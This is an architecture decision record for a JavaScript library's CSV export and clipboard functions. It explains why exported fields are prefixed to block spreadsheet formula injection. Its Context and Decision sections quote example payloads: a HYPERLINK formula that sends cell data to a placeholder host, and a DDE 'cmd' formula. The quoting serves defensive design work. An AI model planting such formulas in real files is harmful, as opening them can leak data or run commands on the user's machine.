# ADR-0066: A CSV is not an inert document

- **Status:** Accepted
- **Date:** 2026-08-21
- **Deciders:** Daniel Polo
- **Related:** [spec 06](../specs/06_spec_table_data.md) §2 F96–F97, §3
  NFR-25/NFR-28/NFR-29/NFR-30; ROADMAP 19.4;
  [ADR-0003](0003-error-taxonomy-stable-codes.md) (the `EGL_*` registry this adds to),
  [ADR-0053](0053-the-full-taxonomy-reaches-the-root.md) (why the new class costs the root
  entry 28 bytes), [ADR-0012](0012-sanitize-default-profile.md) (the precedent for a safe
  default that is documented and defeatable),
  [ADR-0064](0064-the-gate-that-was-watching-nothing.md) (the api-floor scan that caught this
  wave's platform read on the first run),
  [ADR-0065](0065-a-set-of-keys-and-the-page-it-can-see.md) (the selection whose rows this
  exports), [ADR-0059](0059-one-file-one-global-and-a-budget-repinned.md) (the artifact ceiling
  this ADR flags again)

## Context

F96 asks for CSV from the derived rows and spends a third of its words on one sentence: *a
CSV opened in a spreadsheet is a code-execution surface, and a library that hands one to a
user without saying so has shipped the vulnerability for them.*

That is not rhetoric. Every mainstream spreadsheet evaluates a cell whose text begins `=`,
`+`, `-` or `@`. A field reading `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the
neighbouring row to an attacker's server the moment somebody opens the file, and
`=cmd|'/C calc'!A0` historically did worse than that. The data in an export is almost never
the exporter's own — it is whatever users typed into the application — so the exporting
library is the last place that can do anything about it.

F97 asks for the clipboard, and its own hazard is the mirror image: the clipboard is
**permission-gated and secure-context-only**, so a copy button can do nothing at all while
looking exactly like a copy button that worked. "Nothing happened" and "it worked" are the
same picture.

Two smaller forces. NFR-06 keeps runtime dependencies at zero, which rules XLSX out of core
and makes the CSV writer the extension point rather than a stepping stone to one. And NFR-29
splits the feature: the serializer is pure and belongs on `/table`, where a server render can
build the same file; only the clipboard write needs a browser.

## Decision

**1. `tableCsv(rows, {columns, …})` on `egl-utils-js/table` — pure, RFC 4180, no `Blob`, no
download.** A string comes out. What the caller does with it (the clipboard, a `Blob`, a POST
to their own service) is theirs, and that is what keeps the function on the Node-safe entry.

**2. Formula injection is neutralized by default, with a `'` prefix — except where the whole
field is a number.** The exception is the load-bearing part of this decision. The OWASP list
includes `-`, and `-5` is data: prefixing every negative number would corrupt every numeric
column in every export to buy nothing at all, and a mitigation that damages ordinary data is
one people switch off wholesale. So a field whose entire text parses as a finite number is
left alone, and everything else with a risky leading character is prefixed —
`-2+3+cmd|'/C calc'!A0` is not a number, and neither is `- 5`.

The default is defeatable (`neutralizeFormulas: false`), because a caller who knows their
consumer is a parser and not a spreadsheet should not have to strip prefixes back out. One
greppable word, in the ADR-0012 mould: safe by default, and the exit is explicit.

**3. Headers are neutralized too.** A column `label` can come from data as easily as a cell
can.

**4. Quote only where the grammar requires it**, plus fields with edge whitespace. Quoting
everything is also valid and is what most naive writers do; quoting minimally keeps an export
readable and diffable, which is what exports are usually for. Edge whitespace is quoted
because it is the one case where a lenient and a strict parser disagree about the value.

**5. `newline` is an option, and that is a data-integrity decision rather than a
convenience.** RFC 4180 says CRLF and CRLF is the default, but a caller who wants LF and does
`text.replace(/\r\n/g, '\n')` would also rewrite the CRLFs **inside quoted fields** —
corrupting data while appearing to reformat a file. Better to offer the option than to leave
that as the obvious workaround.

**6. The export reads values, not rendered content.** `column.getValue` and a CSV-specific
`column.text` — deliberately **not** the table's `format`, which returns `Content` and may be
a DOM node. A node has no text form, and reading it anyway would make the file disagree with
the screen in ways nobody can see. A `label` is used as the header only when it is a string,
for the same reason: `[object Object]` is a worse heading than the key.

**7. `copyToClipboard(text, {window})` on `egl-utils-js/dom`, and every refusal is typed.**
A new `ClipboardError` (`EGL_CLIPBOARD`) carrying a `reason`: `'unsupported'`, `'insecure'`,
`'denied'`, `'failed'`. The four exist because the remedies differ — an HTTP page can be
served over HTTPS, a refused permission is the user's to grant, and an engine without the API
cannot be talked into having one — and a caller who cannot tell them apart can only say
"something went wrong".

**8. There is no fallback.** The `document.execCommand('copy')` textarea trick is deprecated,
silently unreliable, and would convert a typed failure back into exactly the ambiguity F97
exists to remove. A test asserts `execCommand` is never called.

**9. `ClipboardError` reaches the root as well as `/errors`**, per ADR-0053's contract that
the full taxonomy is reachable from both. It costs the root row 28 bytes, and that is the
contract working rather than a surprise.

## Alternatives Considered

- **Neutralize by wrapping the field in quotes instead of prefixing.** Rejected: quoting is
  the CSV grammar's own escaping and spreadsheets strip it before evaluating, so a quoted
  `"=1+1"` still evaluates. It looks like a mitigation and is not one.
- **Neutralize with a leading tab or space** rather than `'`. Rejected: both change the value
  in ways a reader cannot distinguish from real data, while `'` is the convention spreadsheets
  themselves use to mark a cell as text and is visibly deliberate in a diff.
- **Neutralize nothing and document the hazard.** Rejected on the requirement's own argument:
  the library is the last place that can act, and a note in a README is not a mitigation. The
  reverse default — safe unless asked otherwise — is the one this project has taken since
  ADR-0012.
- **Neutralize every risky prefix with no numeric exception.** Rejected: see decision 2. It is
  the version that gets switched off.
- **Emit a `Blob` or trigger a download.** Rejected: it would put the DOM in the serializer and
  break the NFR-29 split for no gain — a caller who wants a download writes three lines with
  the string, and a caller on a server wants the string.
- **An XLSX writer, or a hook shaped for one.** Rejected by NFR-06, as F96 says. `tableCsv`
  taking rows and returning text *is* the extension point: the same rows go to any writer.
- **A `document.execCommand` fallback for older engines.** Rejected: see decision 8. The
  supported floor (Safari 16.4, ADR-0050) has the async clipboard everywhere.
- **Reusing `DomContractError` for clipboard refusals.** Rejected: a denied permission is not
  a contract violation by the caller, and conflating them would make the one code that means
  "you wired this wrong" also mean "the user said no".

## Consequences

- **Surface 119 → 123**, four additions (`tableCsv`, `copyToClipboard`, and `ClipboardError`
  on both the root and `/errors`), proved as a diff. The `EGL_*` registry is eleven codes, and
  an addition is a minor by ADR-0003.
- **The round-trip is proved against an independent parser.** The property suite carries an
  RFC 4180 reader written from the specification rather than from the writer — a round-trip
  through the writer's own inverse would only prove the writer agrees with itself. Fields are
  generated to be hostile to the grammar: the delimiter, the quote, both terminators, and every
  risky leading character. One property states the security claim directly: **no emitted field
  begins with a character a spreadsheet evaluates**, numbers aside.
- **A test of mine was wrong before the code was.** The first draft of the injection suite
  listed `+1` as a payload; it is a number, and the numeric exception leaves it alone. The
  failure was the test contradicting a decision the code had already made correctly — worth
  recording, because the alternative reading (weaken the exception to satisfy the test) was
  available and would have been wrong.
- **The 19.8 gate paid for itself immediately.** `navigator.clipboard` is read through optional
  chaining, which was invisible to the api-floor scan until ADR-0064 fixed it a wave ago. The
  gate flagged it on the first run; the inventory is 41 entries, with `Clipboard.writeText` and
  `isSecureContext` hand-declared for the shapes a text scanner cannot see.
- **WebKit resolves `writeText` and refuses `readText`.** Writing is treated as safe; reading
  needs a user gesture. So the browser suite asserts the outcome rather than the engine: a
  resolve must have written the exact text the grammar describes, a rejection must be a typed
  `EGL_CLIPBOARD`, and the read-back — the stronger check — is asserted where the platform
  allows it and *reported* where it does not. Firefox could not be launched locally (a machine
  problem, every test, unrelated); CI covers it.
- **The artifact ceiling is now the wave's live constraint.** 31444 B at M18 → 33982 B (19.2) →
  35671 B (19.3) → **36541 B (19.4)**, which is **91% of NFR-22's 40 kB authoring ceiling**,
  with three items left (19.5–19.7) and all three landing in this file. The row is re-pinned at
  +3% as before, and the decision belongs to the item that crosses it: amend the clause with a
  measured argument, or split the artifact. Stated here for the third time so it is a choice
  when it arrives rather than a red build.
- **The root row had zero headroom.** ADR-0053's 6.1 kB was exactly the measured 6072 B plus
  28; adding `ClipboardError` put it at precisely 6100 B. Re-pinned to 6.25 kB — a limit a
  change can land on exactly is a limit that will fail the next unrelated PR.

## References

- Spec 06 §2 F96–F97, §3 NFR-29 (the split), NFR-30 (budgets move per PR, with reasons).
- OWASP CSV Injection — the risky-prefix set, and the reason `-` is on it.
- ADR-0012 — safe by default, documented, defeatable: the same shape, four years of practice
  earlier in this repository's own history.
